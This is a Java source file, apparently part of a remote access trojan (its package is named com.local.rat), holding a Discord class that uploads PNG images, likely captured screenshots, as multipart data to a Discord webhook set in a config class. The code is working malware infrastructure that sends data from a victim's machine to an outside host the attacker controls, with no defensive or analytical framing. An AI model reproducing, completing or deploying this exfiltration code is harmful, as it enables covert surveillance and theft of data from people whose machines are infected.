package com.local.rat;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public class Discord {
    public static String upload(byte[] png, String filename) {
        HttpURLConnection c = null;
        try {
            URL u = new URL(Config.DISCORD_WEBHOOK);
            c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            String boundary = "----" + UUID.randomUUID();
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream os = c.getOutputStream();
            os.write(("--" + boundary + "\r\n"
                    + "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n"
                    + "Content-Type: image/png\r\n\r\n").getBytes("UTF-8"));
            os.write(png);
            os.write(("\r\n--" + boundary + "--\r\n").getBytes("UTF-8"));
            os.flush();
            os.close();

            int code = c.getResponseCode();
            if (code >= 200 && code < 300) return "ok";
            InputStream es = c.getErrorStream();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            if (es != null) {
                byte[] b = new byte[4096]; int n;
                while ((n = es.read(b)) > 0) bos.write(b, 0, n);
                es.close();
            }
            return "err discord " + code + " " + bos.toString("UTF-8");
        } catch (Exception e) {
            return "err " + e.getMessage();
        } finally {
            if (c != null) c.disconnect();
        }
    }
}
